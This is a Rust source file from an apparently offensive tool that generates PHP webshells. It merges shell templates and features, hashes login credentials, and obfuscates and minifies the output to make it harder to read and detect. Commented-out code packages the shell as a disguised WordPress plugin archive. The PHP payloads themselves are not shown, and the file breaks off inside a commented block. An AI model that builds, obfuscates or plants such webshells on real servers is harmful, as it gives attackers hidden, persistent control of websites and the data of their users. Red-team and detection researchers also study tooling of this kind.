use std::collections::HashMap;
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::rc::Rc;

use anyhow::Context;
use fancy_regex::{Captures, Regex};
use glob::glob;
use sha2::{Digest, Sha512};

use crate::cli_arguments::{CliGenerateArguments, CliGenerateObfuscation, CliGeneratePhpTemplate};
use crate::enums::php::{PhpCms, PhpVersion};
use crate::enums::php::TemplateVariant;
use crate::extract_unique_strings::extract_unique_strings;
use crate::generate_random_string::{generate_password, generate_random_string};
use crate::pretty_print_filesize::pretty_print_filesize;
use crate::strategies::webshell::php_feature::PhpFeature;

#[derive(Debug, Default, Clone)]
struct Substitution {
	/// The placeholder to replace
	placeholder: String,
	/// The value to replace the placeholder with
	value: String,
}

#[derive(Debug)]
pub struct Generator<'a> {
	/// The CLI arguments
	args: &'a CliGenerateArguments,
	/// The PHP template arguments
	php_args: &'a CliGeneratePhpTemplate,

	/// The base path of the PHP templates
	base_template_path: PathBuf,
	/// The path of the PHP template (where files are actually stored and loaded from)
	template_path: PathBuf,
	/// The path of the CMS template (where files are actually stored and loaded from)
	cms_path: Option<PathBuf>,

	/// The generated/loaded PHP code
	code: String,
	/// The generated/loaded CSS code
	css: String,
	/// The generated/loaded JS code
	js: String,
	/// The placeholders of the PHP template, loaded after all the features are bundled
	placeholders: Vec<String>,
	/// The list of substitutions to apply to the template
	substitutions: Vec<Substitution>,
	/// A pointer to the function prefix substitution
	function_prefix: Substitution,

	/// The features of the PHP template
	features: Vec<PhpFeature>,
}

impl<'a> Generator<'a> {
	/// Create a new PHP webshell generator
	pub fn new(args: &'a CliGenerateArguments, php_args: &'a CliGeneratePhpTemplate) -> Self {
		Self {
			args,
			php_args,
			base_template_path: PathBuf::from("templates/php/"),
			template_path: PathBuf::new(),
			cms_path: None,
			code: String::new(),
			css: String::new(),
			js: String::new(),
			features: Vec::new(),
			placeholders: Vec::new(),
			substitutions: Vec::new(),
			function_prefix: Substitution::default(),
		}
	}

	/// Generate the PHP webshell
	pub fn generate(&mut self) -> anyhow::Result<()> {
		// Define the templates path to load the PHP templates from
		self.make_template_path();
		self.make_cms_path();

		debug!("Base template path: {}", self.base_template_path.display());
		debug!("Template path: {}", self.template_path.display());

		let displayable_cms_path = match self.cms_path.as_ref() {
			None => "CMS path not loaded".to_string(),
			Some(path) => path.display().to_string(),
		};
		debug!("CMS path: {}", displayable_cms_path);
		info!("Generating PHP webshell (version: {}-{})", self.compute_version_path(), self.php_args.variant);

		self.load_code()?;
		self.load_css();
		self.load_js();

		// Load the features of the PHP template
		self.load_features()?;
		debug!("Features loaded: {}", self.features.iter().map(|f| f.name.clone()).collect::<Vec<String>>().join(", "));
		info!("Loaded {} features", self.features.len());

		// Load the injection point
		let injection_point = self.load_injection_point();
		debug!("Injection point loaded: {:?}", injection_point);
		info!("Loaded {} injection points", injection_point.len());

		info!("Building the webshell ...");
		self.code = self.build(injection_point);
		let mut code_size = self.code.len() as u64;
		info!("Preliminary artifact built (size: {})", pretty_print_filesize(code_size));

		let (username, password) = self.make_username_and_password();
		self.extract_placeholders();
		debug!("Template placeholders: {:?}", self.placeholders);

		self.make_substitutions(username, password);
		self.apply_substitutions();
		info!(
			"Placeholders replaced (size: {}, reduction: {:.2}%)",
			pretty_print_filesize(self.code.len() as u64),
			self.compute_size_gain(code_size)
		);
		code_size = self.code.len() as u64;

		if self.args.obfuscation.obfuscate {
			info!("Obfuscating ...");
			self.obfuscate();
			info!(
				"Obfuscation completed (size: {}, reduction: {:.2}%)",
				pretty_print_filesize(self.code.len() as u64),
				self.compute_size_gain(code_size)
			);
			code_size = self.code.len() as u64;
		}

		if self.args.obfuscation.minify {
			info!("Minifying ...");
			self.minify();
			info!(
				"Minification completed (size: {}, reduction: {:.2}%)",
				pretty_print_filesize(self.code.len() as u64),
				self.compute_size_gain(code_size)
			);
			code_size = self.code.len() as u64;
		}

		match self.php_args.cms {
			None => {
				self.write_webshell()?;
			}
			Some(cms) => {
				/*match cms {
					PhpCms::Wordpress => {
						info!("Generating WordPress webshell ...");

						if cms_path.is_none() {
							return Err(anyhow::anyhow!("Inconsistent state, the WordPress template path is not set. WordPress webshell generation failed."));
						}

						let plugin_path = cms_path.unwrap().join("template.php");
						let mut plugin_code = std::fs::read_to_string(plugin_path.clone())
							.with_context(|| format!("Could not read the WordPress plugin code file at {}", &plugin_path.display()))?;

						// Remove the PHP opening tag from the shell code as it is already present in the plugin code
						code = code.trim_start_matches("<?php").to_string();

						// Insert the webshell code into the plugin code
						plugin_code = plugin_code.replace("// __TEMPLATE_INSERTION_POINT__", &code);

						// Strip all comments from the plugin code
						if !args.obfuscation.minify {
							plugin_code = strip_comments(&plugin_code);
						} else {
							plugin_code = minify(&plugin_code);
						}

						if args.obfuscation.obfuscate {
							plugin_code = obfuscate(&plugin_code, &args.obfuscation, &functions_prefix);
						}

						// load the CMS options
						let plugin_info = parse_cms_options(php_args);
						let fallback_info = make_wordpress_fallback_info();

						// Get the plugin name from the plugin information or the fallback information
						let plugin_name = plugin_info.get("__PLUGIN_NAME__").unwrap_or(fallback_info.get("__PLUGIN_NAME__").unwrap());

						// Insert the plugin information into the plugin code
						plugin_code.insert_str(
							5,
							&format!(
								"
/*
 * Plugin Name: {}
 * Description: {}
 * Version: {}
 * Author: {}
 * Requires PHP: {}
 */
 ",
								plugin_name,
								plugin_info.get("__PLUGIN_DESCRIPTION__").unwrap_or(fallback_info.get("__PLUGIN_DESCRIPTION__").unwrap()),
								plugin_info.get("__PLUGIN_VERSION__").unwrap_or(fallback_info.get("__PLUGIN_VERSION__").unwrap()),
								plugin_info.get("__PLUGIN_AUTHOR__").unwrap_or(fallback_info.get("__PLUGIN_AUTHOR__").unwrap()),
								php_args.template_version.to_string()
								        .split("&")
								        .collect::<Vec<&str>>()
								        .get(0)
								        .unwrap()
								        .replace("PHP >=", "")
								        .trim()
							),
						);

						// Replace the missing with the previously defined prefix
						plugin_code = plugin_code.replace("__PREFIX__", functions_prefix.as_str());

						// Write the webshell as a WordPress plugin archive if the plugin mode is enabled or not in standalone mode
						if php_args.plugin || !php_args.standalone {
							info!("Generating WordPress plugin archive ...");

							let mut plugin_archive_path = match &args.output {
								Some(output) => PathBuf::from(output),
								None => PathBuf::from("plugin.zip"),
							};

							// Set the output path to the plugin archive
							if !plugin_archive_path.ends_with(".zip") {
								plugin_archive_path.set_extension("zip");
							}

							// Create the plugin archive
							let mut zip = zip::ZipWriter::new(
								std::fs::File::create(&plugin_archive_path)
									.with_context(|| format!("Could not create the plugin archive file: {}", plugin_archive_path.display()))?
							);

							let options = zip::write::SimpleFileOptions::default()
								.compression_method(zip::CompressionMethod::Deflated)
								.unix_permissions(0o777);

							// Add the plugin code to the archive
							zip.start_file(format!("{plugin_name}/plugin.php"), options)
							   .with_context(|| format!("Could not add the plugin code to the archive: {}", plugin_archive_path.display()))?;
							zip.write_all(plugin_code.as_bytes())
							   .with_context(|| format!("Could not write the plugin code to the archive: {}", plugin_archive_path.display()))?;

							zip.finish()
							   .with_context(|| format!("Could not finish the plugin archive: {}", plugin_archive_path.display()))?;

							info!("WordPress plugin archive generated successfully: {}", plugin_archive_path.display());
						}

						// Write the webshell to the output file if not generating a plugin archive or in standalone mode
						if php_args.standalone || !php_args.plugin {
							let mut output_path = match &args.output {
								Some(output) => PathBuf::from(output),
								None => PathBuf::from("plugin.php"),
							};

							// Set the output path to the plugin archive
							if !output_path.ends_with(".php") {
								output_path.set_extension("php");
							}

							std::fs::write(&output_path, plugin_code)
								.with_context(|| format!("Could not write the output file: {}", output_path.display()))?;

							info!("Webshell written to {}", output_path.display());
						}

						info!("Plugin Name: {}", plugin_name);
						info!("Username: {}", args.security.username.as_ref().unwrap());
						info!("Password: {}", args.security.password.as_ref().unwrap());
						info!("Enjoy your webshell!");
					}
					PhpCms::Joomla => {
						error!("Joomla is not implemented yet. Exiting ...");
						unimplemented!("Joomla is not implemented yet");
					}
					PhpCms::Drupal => {
						error!("Drupal is not implemented yet. Exiting ...");
						unimplemented!("Drupal is not implemented yet");
					}
				}*/
			}
		}

		info!("Username: {}", self.args.security.username.as_ref().unwrap());
		info!("Password: {}", self.args.security.password.as_ref().unwrap());
		info!("Enjoy your webshell!");

		Ok(())
	}

	/// Compute the size gain percentage
	fn compute_size_gain(&self, original_size: u64) -> f64 {
		((original_size as f64 - self.code.len() as f64) / original_size as f64) * 100.0
	}

	/// Write the simple PHP (no CMS) webshell to the output file
	fn write_webshell(&self) -> anyhow::Result<()> {
		let mut output_path = match &self.args.output {
			Some(output) => PathBuf::from(output),
			None => PathBuf::from("shell.php"),
		};

		// Set the output path to the plugin archive
		if !output_path.ends_with(".php") {
			output_path.set_extension("php");
		}

		fs::write(&output_path, &self.code)
			.with_context(|| format!("Could not write the output file: {}", output_path.display()))?;

		info!("Webshell written to {}", output_path.display());

		Ok(())
	}

	/// Strip comments from a PHP code
	///
	/// This function will remove all comments from the code to make it smaller and harder to read
	///
	/// Whitelisted comments are those that should not be removed, such as URLs and specific comments, the following
	/// patterns are whitelisted:
	/// - `://` - URLs, example: "https://example.com"
	/// - `"//` - Strings concatenation at the beginning of the line, example: "//" . "string"
	/// - `(//` - Strings containing domain-like specifications, example: "connected successfully (//domain)"
	/// - `\w\s//` - Strings containing domain-like specifications (prefixed with a letter and a space), example: "example //domain"
	/// - ` - do not remove - ` - Comments that should not be removed
	/// - ` - DO NOT REMOVE - ` - Comments that should not be removed
	fn strip_comments(&mut self) {
		// Regex patterns for line comments (// ...) and multiline comments (/* ... */) in PHP
		let comments_patters = Regex::new(
			r#"((?<![:"(]|\w )\/\/(?! - do not remove - | - DO NOT REMOVE - ).*\s*|\/\*(.|\s)*?\*\/\s*)"#
		).unwrap();

		// Remove comments
		self.code = comments_patters.replace_all(&self.code, "").to_string()
	}

	/// Minify a PHP code
	///
	/// This function will remove all comments and unnecessary whitespace from the code, drastically reducing the overall file size
	fn minify(&mut self) {
		self.strip_comments();

		// Replace "<?php\s*" with "<?php " to avoid dropping the whitespace after the opening tag
		let php_opening_tag = Regex::new(r#"<\?php\s*"#).unwrap();
		self.code = php_opening_tag.replace_all(&self.code, "<?php ").to_string();

		// Remove whitespaces, tabs, newlines, and double spaces
		self.code = self.code.replace("\n", "") // make a one-liner
		                .replace("\r", "") // remove carriage returns
		                .replace("\t", "") // remove tabs
		                .replace(",)", ")") // remove trailing commas
		                .replace("exit();", "die;") // replace exit with die (shorter)
		                .replace("exit;", "die;") // replace exit with die (shorter) - for the case of exit without parentheses
		                .replace("else if", "elseif") // replace exit with die (shorter) - for the case of exit without parentheses
		                .replace("  ", ""); // remove double spaces

		// Remove whitespaces around special constructors
		let variable_definition_regex = Regex::new(r#"\s*(=>|===|==|/=|\*=|\.=|\+=|\-=|&=|\|=|\?|:|\+|\*|\-|/|=|&&|\|\||&|\|)\s*"#).unwrap();
		self.code = variable_definition_regex.replace_all(&self.code, "$1").to_string();

		// Remove whitespaces around string concatenations
		let variable_definition_regex = Regex::new(r#"("|\)|'|\])\s*\.\s*("|\(|'|\$|PHP_EOL|\[)"#).unwrap();
		self.code = variable_definition_regex.replace_all(&self.code, "$1.$2").to_string();

		// Remove whitespaces in short echo syntax (<?= ... ?>)
		let variable_definition_regex = Regex::new(r#"<\?=\s*(\$?.+?)\s*\?>"#).unwrap();
		self.code = variable_definition_regex.replace_all(&self.code, "<?=$1?>").to_string();

		// Remove whitespaces in argument lists, function calls, and array definitions
		let variable_definition_regex = Regex::new(r#"(,|;)\s*"#).unwrap();
		self.code = variable_definition_regex.replace_all(&self.code, "$1").to_string();

		// Remove whitespaces in function declaration, ifs and similar
		let variable_definition_regex = Regex::new(r#"(\)|if|while|else|elseif|do|try|catch)\s*(\{|\()"#).unwrap();
		self.code = variable_definition_regex.replace_all(&self.code, "$1$2").to_string();

		// Remove whitespaces in language constructs
		let variable_definition_regex = Regex::new(r#"(return|echo|global)\s*(\$|"|')"#).unwrap();
		self.code = variable_definition_regex.replace_all(&self.code, "$1$2").to_string();

		// Remove whitespaces in html attributes
		let variable_definition_regex = Regex::new(r#"(?<="|')\s+(?=[^<>\s]+=)"#).unwrap();
		self.code = variable_definition_regex.replace_all(&self.code, "").to_string();

		if self.args.obfuscation.remove_icons {
			// Remove icons from the code
			let icon_regex = Regex::new(r#"(['"]svg['"]\s*=>\s*['"])<svg(?>.|\s)+?<\/svg>(['"])"#).unwrap();
			self.code = icon_regex.replace_all(&self.code, "$1$2").to_string();
		}
	}

	/// Obfuscate all the duplicated function calls in the PHP code creating global variables and importing them
	fn obfuscate_duplicated_function_calls(&mut self) {
		// Parse and analyze PHP code to identify repeated function calls ex. function_name(arguments)
		let function_name_regex = Regex::new(r#"(?<!function)(?>\s+)(\w+)(\((?>.|\s)*?\))"#).unwrap();
		let immutable_code_ref = self.code.clone();
		let captures = function_name_regex.captures_iter(&immutable_code_ref);

		// array of tuples containing the function name and its arguments
		let mut function_calls = vec![];

		for capture in captures {
			if let Ok(capture) = capture {
				let function_name = capture.get(1).unwrap().as_str();
				let arguments = capture.get(2).unwrap().as_str();

				// Skip the function that are whitelisted for existence
				if [
					"array",
				].contains(&function_name) {
					continue;
				}

				function_calls.push((function_name, arguments));
			}
		}

		debug!("Detected function calls: {:?}", function_calls);
		info!("Detected function calls (count: {})", function_calls.len());

		// Identify repeated function calls and generate a replacement for them
		let mut candidate_to_replacement = HashMap::new();
		for (function_name, arguments) in &function_calls {
			// Skip the function if it is already in the replacement map
			if (candidate_to_replacement.contains_key(function_name)) {
				continue;
			}

			let mut count = 0;
			// Count the number of times the function is called
			function_calls.iter().filter(|(f, _)| f == function_name).for_each(|_| count += 1);

			// If the function is called more than twice, generate a replacement for it
			if count > 2 {
				candidate_to_replacement.insert(
					*function_name,
					(
						count,
						generate_random_string(self.args.obfuscation.obfuscation_function_format.as_str()).unwrap()
					),
				);
			}
		}

		debug!("candidate_to_replacement: {:?}", candidate_to_replacement);
		info!("Duplicated function calls detected (count: {})", candidate_to_replacement.len());
		info!("Generating global variable aliases for the duplicated function calls ...");

		// Generate global variable aliases for repeated function calls and replace all function calls with the aliases
		for (function_name, (_, substitution)) in candidate_to_replacement.iter() {
			let global_alias = format!("${}", substitution);
			let alias_declaration = format!("{} = \"{}\";\n", global_alias, function_name);

			let replacement_function_name_regex = Regex::new(format!(r#"((?<!function)(?>\s+)){}(\((?>.|\s)*?\))"#, function_name).as_str()).unwrap();
			// ---------------------------------------------------------|caps[1]-------------|--|caps[2]-------|
			// Replace all occurrences of the function name with the global alias
			self.code = replacement_function_name_regex.replace_all(
				&self.code,
				|caps: &Captures| format!("{}{}{}", &caps[1], &global_alias, &caps[2]),
			).to_string();

			// Insert the global alias declaration at the beginning of the PHP code
			self.code.insert_str(self.code.find("<?php").unwrap() + 5 + 1, &alias_declaration); // +5 for the length of "<?php" and +1 for the space or newline
		}

		// function definition split into name and body this allows for the definition of the global imports
		// immediately at the beginning of the function
		let regex = Regex::new(r#"(function\s+\w+\((?>.|\s)*?\)\s*{)((?>.|\s)*?})"#).unwrap();
		// immutable copy of the whole code to allow direct code modification while keeping the state of the regex
		let immutable_code_ref = self.code.clone();
		let captures = regex.captures_iter(immutable_code_ref.as_str());

		for capture in captures {
			if let Ok(capture) = capture {
				let function_declaration = capture.get(1).unwrap().as_str();
				let mut function_body = capture.get(2).unwrap().as_str();

				// NOTE: The following implementation to extract the function body is not the most efficient nor the most
				//       error proof, one assumption that it's supposed to always be true is that the function body
				//       is always enclosed by brackets, and that no brackets are present as a text in the function body
				//       this may not be the case in all PHP code.
				//       Consider encoding in some way any brackets that are present in the function body to avoid any
				//       issue.
				//
				//       Possible improvement? AST parsing of the PHP code to extract the function body, this would also
				//       allow for a more accurate extraction of the function body and the function declaration, reducing
				//       the number of regexes needed.

				// count the number of open and close brackets in the function body to understand the function boundaries
				let mut count_open_bracket = function_body.chars().filter(|&c| c == '{').count() + 1; // +1 for the function declaration
				let mut count_close_bracket = function_body.chars().filter(|&c| c == '}').count();
				// find the end of the function declaration
				let function_declaration_index = self.code.find(function_declaration).unwrap() + function_declaration.len();
				// iterate until the number of open brackets is equal to the number of close brackets, this is the function body
				while count_open_bracket != count_close_bracket {
					// find the index of the function body starting from the end of the function declaration
					let function_body_index = self.code[function_declaration_index..].find(function_body).unwrap_or(0) + function_body.len();
					// find the index of the next closed bracket starting from the end of the function body
					let next_closed_bracket_index = self.code[function_declaration_index + function_body_index..].find('}').unwrap_or(0);

					// extract the new function body
					function_body = &self.code[function_declaration_index..=function_declaration_index + function_body_index + next_closed_bracket_index];

					// update the number of open and close brackets
					count_open_bracket = function_body.chars().filter(|&c| c == '{').count() + 1; // +1 for the function declaration
					count_close_bracket = function_body.chars().filter(|&c| c == '}').count();
				}

				// global imports for the function
				let mut global_imports = vec![];
				// replacement for the function body
				let mut function_body_replacement = function_body.clone().to_string();

				for (_, (_, function_name)) in candidate_to_replacement.iter() {
					// if the function body contains the function name, add it to the global imports
					if function_body.contains(format!("${}(", function_name).as_str()) {
						global_imports.push(format!("${}", function_name));
					}
				}

				// regex to match global variable declarations, ex. global $var1,$var2, $var3;
				let globals_regex = Regex::new(r#"global\s+((?>\$\w+,?\s*)+?);"#).unwrap();
				let globals_captures = globals_regex.captures_iter(&function_body);

				for capture in globals_captures {
					if let Ok(capture) = capture {
						// extract the global variables and remove them from the function body
						let globals = capture.get(1).unwrap().as_str();
						function_body_replacement = globals_regex.replace_all(&function_body_replacement, "").to_string();

						// then split the global variables and add them to the global imports
						let globals_replacement = globals.split(",").map(|g| g.trim().to_string()).collect::<Vec<String>>();
						global_imports.extend(globals_replacement);
					}
				}

				debug!("global_imports: {:?}", global_imports);

				// if there are no global imports, skip the function
				if (global_imports.is_empty()) {
					continue;
				}

				// generate the global imports declaration and insert it at the beginning of the function body
				let global_imports_declaration = format!("\nglobal {};", global_imports.join(","));
				function_body_replacement.insert_str(0, &global_imports_declaration);

				// replace the function definition with the new one
				self.code = self.code.replace(
					format!("{}{}", function_declaration, function_body).as_str(),
					format!("{}{}", function_declaration, function_body_replacement).as_str(),
				);
			}
		}
	}

	/// Obfuscate the PHP variable names
	fn obfuscate_variable_names(&mut self) {
		let all_var_definitions = extract_unique_strings(&self.code, r#"\$\w+"#);
		let php_global_excluded_variables = all_var_definitions.iter().filter(|var| !var.starts_with("$_")).collect::<Vec<_>>();
		debug!("Php variable definitions (without globals): {:?}", php_global_excluded_variables);

		// substitute the variable names one by one
		for var in php_global_excluded_variables.iter() {
			let casual_name = generate_random_string(
				format!("${}", self.args.obfuscation.obfuscation_variable_format.as_str()).as_str()
			).unwrap();
			self.code = self.code.replace(*var, &casual_name);
		}

		info!("Php variable names obfuscated (count: {})", php_global_excluded_variables.len());
	}

	/// Obfuscate the PHP function names
	fn obfuscate_function_names(&mut self) {
		let all_func_definitions = extract_unique_strings(&self.code, r#"function\s+\w+"#);
		debug!("Php function definitions: {:?}", all_func_definitions);

		for func in all_func_definitions.iter() {
			// func = function <name>
			// casual_name = full function definition replacement
			let casual_name = generate_random_string(
				format!("function {}{}", self.function_prefix.value, self.args.obfuscation.obfuscation_function_format).as_str()
			).unwrap();

			let func_fragments = func.split_whitespace().collect::<Vec<&str>>();
			let casual_function_name_fragments = casual_name.split_whitespace().collect::<Vec<&str>>();

			// call_user_func_name = '<name>' or "<name>" (isolated function name with quotes, reported in strings and indirect calls)
			let call_user_func_name = func_fragments.get(1).unwrap();
			let call_user_func_apex = format!("'{}'", call_user_func_name);
			let call_user_func_quotes = format!("\"{}\"", call_user_func_name);
			// call_user_func_casual_name = '<casual_name>' or "<casual_name>" replacement for call_user_func_name
			let call_user_func_casual_name = casual_function_name_fragments.get(1).unwrap();
			let call_user_func_casual_name_apex = format!("'{}'", call_user_func_casual_name);
			let call_user_func_casual_name_quotes = format!("\"{}\"", call_user_func_casual_name);

			// direct_function_call_name = <name>( - (reported in direct calls)
			let direct_function_call_name = format!("{}(", call_user_func_name);
			let direct_function_call_casual_name = format!("{}(", call_user_func_casual_name);

			self.code = self.code.replace(func, &casual_name)
			                .replace(&call_user_func_apex, &call_user_func_casual_name_apex)
			                .replace(&call_user_func_quotes, &call_user_func_casual_name_quotes)
			                .replace(&direct_function_call_name, &direct_function_call_casual_name);
		}

		info!("Php function names obfuscated (count: {})", all_func_definitions.len());
	}

	/// Obfuscate a PHP code
	///
	/// This function will obfuscate the variable names and function names in the code
	fn obfuscate(&mut self) {
		self.obfuscate_variable_names();
		self.obfuscate_function_names();
		self.obfuscate_duplicated_function_calls();
	}

	/// Apply the substitutions to the PHP template
	fn apply_substitutions(&mut self) {
		for substitution in self.substitutions.iter() {
			self.code = self.code.replace(&substitution.placeholder, &substitution.value);
		}
	}

	/// Make the substitutions list for the PHP template
	fn make_substitutions(&mut self, username: String, password: String) {
		self.make_function_prefix_substitution();

		self.substitutions.push(Substitution {
			placeholder: "__USERNAME__".to_string(),
			value: username,
		});

		self.substitutions.push(Substitution {
			placeholder: "__PASSWORD__".to_string(),
			value: password,
		});

		self.substitutions.push(Substitution {
			placeholder: "__SALT__".to_string(),
			value: self.args.security.salt.as_ref().unwrap().to_string(),
		});

		for placeholder in self.placeholders.iter() {
			let value = match placeholder.as_str() {
				"__WP__" => "__WP__".to_string(),
				name => {
					if name.starts_with("__FEAT_") || name.starts_with("__PARAM_") || name == "__OPERATION__" {
						generate_random_string(r"\w\d{2}").unwrap()
					} else {
						generate_password(5).unwrap()
					}
				}
			};

			self.substitutions.push(Substitution {
				placeholder: placeholder.clone(),
				value,
			});
		}
	}

	/// Make the function prefix substitution
	fn make_function_prefix_substitution(&mut self) {
		let prefix = Substitution {
			placeholder: "__PREFIX__".to_string(),
			value: generate_random_string(self.php_args.functions_prefix.as_str()).unwrap(),
		};
		self.function_prefix = prefix.clone();
		self.substitutions.push(prefix);
	}

	/// Extract the placeholders from the PHP template
	fn extract_placeholders(&mut self) {
		self.placeholders = extract_unique_strings(&self.code, r#"__[0-9a-zA-Z_]+__"#);
	}

	/// Generate the hashed username and password for the login feature (if present)
	fn make_username_and_password(&self) -> (String, String) {
		// If the login feature is not present, return empty strings
		if !self.features.iter().any(|f| f.name == "login") {
			return (String::new(), String::new());
		}

		// Generate the hashed username and password (salted & hex-encoded)
		let mut buffer_username = [0u8; 128];
		let hashed_username = base16ct::lower::encode_str(
			Sha512::digest(
				format!("{}{}", self.args.security.username.as_ref().unwrap(), self.args.security.salt.as_ref().unwrap())
			).as_slice(),
			&mut buffer_username,
		).unwrap();
		debug!("Hashed username generated: {}", hashed_username);

		let mut buffer_password = [0u8; 128];
		let hashed_password = base16ct::lower::encode_str(
			Sha512::digest(
				format!("{}{}", self.args.security.password.as_ref().unwrap(), self.args.security.salt.as_ref().unwrap())
			).as_slice(),
			&mut buffer_password,
		).unwrap();
		debug!("Hashed password generated: {}", hashed_password);

		(hashed_username.to_string(), hashed_password.to_string())
	}

	/// Build the PHP webshell merging the features and the template, the CSS and JS code are also injected in this step
	fn build(&mut self, injection_point: Vec<String>) -> String {
		let mut code = self.code.clone();

		// Replace the CSS placeholder
		code = code.replace("__CSS__", self.css.replace("'", "\\'").as_str());

		// Replace the JS placeholder
		code = code.replace("__JS__", &self.js);

		// Replace the features placeholders
		for injection in injection_point.iter() {
			if injection.starts_with("section") {
				let parts = injection.split('.').collect::<Vec<&str>>();

				if parts.len() != 2 {
					warn!("Invalid injection point: '{}'", injection);
					continue;
				}

				let section = parts[1];
				match section {
					"constants" => {
						let constants = self.features.iter().map(|f| f.constants.clone()).collect::<Vec<String>>().join("\n");
						code = code.replace(format!("// inject: {}", injection).as_str(), &constants);
					}
					"functions" => {
						let functions = self.features.iter().map(|f| f.functions.clone()).collect::<Vec<String>>().join("\n");
						code = code.replace(format!("// inject: {}", injection).as_str(), &functions);
					}
					"hooks" => {
						let hooks = self.features.iter().map(|f| f.hooks.clone()).collect::<Vec<String>>().join("\n");
						code = code.replace(format!("// inject: {}", injection).as_str(), &hooks);
					}
					_ => {
						warn!("Invalid section: '{}'", section);
					}
				}
			} else if injection.starts_with("file://") {
				let file_import = self.template_path.join(injection.replace("file://", ""));
				info!("Importing file: {}", file_import.display());

				let file_content = fs::read_to_string(&file_import);
				match file_content {
					Ok(content) => {
						code = code.replace(injection, &content);
					}
					Err(_) => {
						warn!("Could not read the file: '{}'", file_import.display());
					}
				}
			} else {
				warn!("Invalid injection point: '{}'", injection)
			}
		}

		code
	}

	fn parse_injection_format(&self, injection: &str) -> (String, String) {
		let parts: Vec<&str> = injection.split(':').collect();

		if parts.len() != 2 {
			return (String::new(), String::new());
		}

		(parts[0].to_string(), parts[1].to_string())
	}

	/// Load the injection point of the PHP template
	fn load_injection_point(&self) -> Vec<String> {
		let injection_point = Regex::new(r#"\/\/\s*inject:\s*(.+)"#).unwrap();
		let captures = injection_point.captures_iter(&self.code);

		let mut result = vec![];

		for capture in captures {
			if let Ok(capture) = capture {
				result.push(capture.get(1).unwrap().as_str().to_string());
			}
		}

		result
	}

	/// Load the features of the PHP template
	fn load_features(&mut self) -> anyhow::Result<()> {
		if self.php_args.features.is_empty() {
			return Err(anyhow::anyhow!("No features selected"));
		}

		if self.php_args.features.contains(&"all".to_string()) {
			self.load_all_features()?;
		} else {
			for feature in self.php_args.features.iter() {
				let feature_path = self.template_path.join("features").join(format!("{}.php", feature));
				self.features.push(PhpFeature::new(feature_path));
			}
		}

		Ok(())
	}

	/// Load all the features of the PHP template
	fn load_all_features(&mut self) -> anyhow::Result<()> {
		let features_path = self.template_path.join("features");

		if !Path::exists(&features_path) {
			return Err(anyhow::anyhow!("The features folder does not exist: {}", features_path.display()));
		} else {
			// Create the glob pattern for the root files
			let glob_pattern = format!("{}/**/*.php", features_path.display());

			// Search for files matching the pattern
			if let Ok(entries) = glob(&glob_pattern) {
				// Iterate over the matching files
				for entry in entries.filter_map(Result::ok) {
					// Check if the file is named "root.{extension}"
					if let Some(file_name) = entry.file_name() {
						let level_1_parent = entry.parent().unwrap();

						if level_1_parent.file_name().unwrap().to_str().unwrap() == "features" ||
							level_1_parent.parent().unwrap().file_name().unwrap().to_str().unwrap() == "features" {
							// main/grouped feature found, load it
							self.features.push(PhpFeature::new(entry));
						} else {
							warn!("Feature file found in an unexpected location: '{}'. This won't be loaded.", entry.display());
						}
					}
				}
			}
		}

		Ok(())
	}

	/// Load the PHP code from the template
	fn load_code(&mut self) -> anyhow::Result<()> {
		let code_path = self.template_path.join("root.php");

		info!("Using template code file: {}", code_path.display());

		if !Path::exists(&code_path) {
			return Err(anyhow::anyhow!("The template code file does not exist: {}", code_path.display()));
		} else {
			self.code = std::fs::read_to_string(&code_path)
				.with_context(|| format!("Could not read the template code file at {}", code_path.display()))?
		}

		Ok(())
	}

	/// Load the CSS code from the template
	fn load_css(&mut self) {
		let css_path = self.template_path.join("compiled.css");

		info!("Using template CSS file: {}", css_path.display());

		if !Path::exists(&css_path) {
			warn!("The template CSS file does not exist: {}. Continuing without CSS.", css_path.display());
		} else {
			let css_result = std::fs::read_to_string(&css_path);

			match css_result {
				Ok(css_content) => {
					self.css = css_content;
				}
				Err(_) => {
					warn!("Could not read the template CSS file: {}. Continuing without CSS.", css_path.display());
				}
			}
		}
	}

	/// Load the JS code from the template
	fn load_js(&mut self) {
		let js_path = self.template_path.join("compiled.js");

		info!("Using template JS file: {}", js_path.display());

		if !Path::exists(&js_path) {
			warn!("The template JS file does not exist: {}. Continuing without JS.", js_path.display());
		} else {
			let js_result = std::fs::read_to_string(&js_path);

			match js_result {
				Ok(js_content) => {
					self.js = js_content;
				}
				Err(_) => {
					warn!("Could not read the template JS file: {}. Continuing without JS.", js_path.display());
				}
			}
		}
	}

	/// Create the CMS path and set it to the generator
	fn make_cms_path(&mut self) {
		self.cms_path = match self.php_args.cms {
			None => None,
			Some(cms) => {
				match cms {
					PhpCms::Wordpress => Some(self.base_template_path.join("wordpress/wp-content/plugins/webshell")),

					// TODO: Implement Joomla and Drupal
					PhpCms::Joomla => unimplemented!(),
					PhpCms::Drupal => unimplemented!(),
				}
			}
		};
	}

	/// Create the template path and set it to the generator
	fn make_template_path(&mut self) {
		self.template_path = self.base_template_path
		                         .join(self.compute_version_path())
		                         .join(self.php_args.variant.to_string());
	}

	/// Compute the version path
	fn compute_version_path(&self) -> &str {
		match self.php_args.template_version {
			PhpVersion::_53 => "5.x",
			PhpVersion::_70 => "7.x",
			PhpVersion::_80 => "8.x",
		}
	}
}

/// Generate a PHP webshell
///
/// # Arguments
/// * `args` - The CLI arguments
/// * `php_args` - The PHP template arguments
///
/// # Returns
///
/// An empty `anyhow::Result` if the webshell was generated successfully, an error otherwise
pub fn generate_php_webshell(args: &CliGenerateArguments, php_args: &CliGeneratePhpTemplate) -> anyhow::Result<()> {
	/*

	match php_args.cms {
		None => {
			let mut output_path = match &args.output {
				Some(output) => PathBuf::from(output),
				None => PathBuf::from("shell.php"),
			};

			// Set the output path to the plugin archive
			if !output_path.ends_with(".php") {
				output_path.set_extension("php");
			}

			std::fs::write(&output_path, code)
				.with_context(|| format!("Could not write the output file: {}", output_path.display()))?;

			info!("Webshell written to {}", output_path.display());
			info!("Username: {}", args.security.username.as_ref().unwrap());
			info!("Password: {}", args.security.password.as_ref().unwrap());
			info!("Enjoy your webshell!");
		}
		Some(cms) => {
			match cms {
				PhpCms::Wordpress => {
					info!("Generating WordPress webshell ...");

					if cms_path.is_none() {
						return Err(anyhow::anyhow!("Inconsistent state, the WordPress template path is not set. WordPress webshell generation failed."));
					}

					let plugin_path = cms_path.unwrap().join("template.php");
					let mut plugin_code = std::fs::read_to_string(plugin_path.clone())
						.with_context(|| format!("Could not read the WordPress plugin code file at {}", &plugin_path.display()))?;

					// Remove the PHP opening tag from the shell code as it is already present in the plugin code
